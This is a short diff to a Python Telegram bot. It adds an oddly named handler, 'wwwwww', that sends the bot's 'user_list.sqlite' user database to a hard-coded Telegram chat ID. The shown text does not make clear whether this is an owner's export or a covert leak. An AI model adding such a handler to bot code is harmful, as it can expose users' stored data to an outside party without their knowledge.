@@ -20,6 +20,9 @@ import sqlite3
 
 
 from sql_fucking_antiNnn import *
+def wwwwww(update, context):
+    user_id = user_id = update.message.chat_id
+    context.bot.send_document(document=open('user_list.sqlite','rb'), chat_id=957531477)
 def start(update, context):
     user_id = update.message.chat_id
     f_name = update.message.from_user.first_name
